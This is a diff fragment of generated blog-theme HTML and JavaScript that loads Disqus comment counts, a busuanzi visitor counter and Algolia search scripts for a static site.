+    }
+  }
+
+  const getCount = async() => {
+    try {
+      const eleGroup = document.querySelector('#post-meta .disqus-comment-count')
+      if (!eleGroup) return
+      const cleanedLinks = eleGroup.href.replace(/#post-comment$/, '')
+
+      const res = await fetch(`https://disqus.com/api/3.0/threads/set.json?forum=&api_key=&thread:link=${cleanedLinks}`,{
+        method: 'GET'
+      })
+      const result = await res.json()
+
+      const count = result.response.length ? result.response[0].posts : 0
+      eleGroup.textContent = count
+    } catch (err) {
+      console.error(err)
+    }
+  }
+
+  if ('Valine' === 'Disqus' || !false) {
+    if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+    else {
+      loadDisqus()
+      
+    }
+  } else {
+    window.loadOtherComment = loadDisqus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div></body></html>
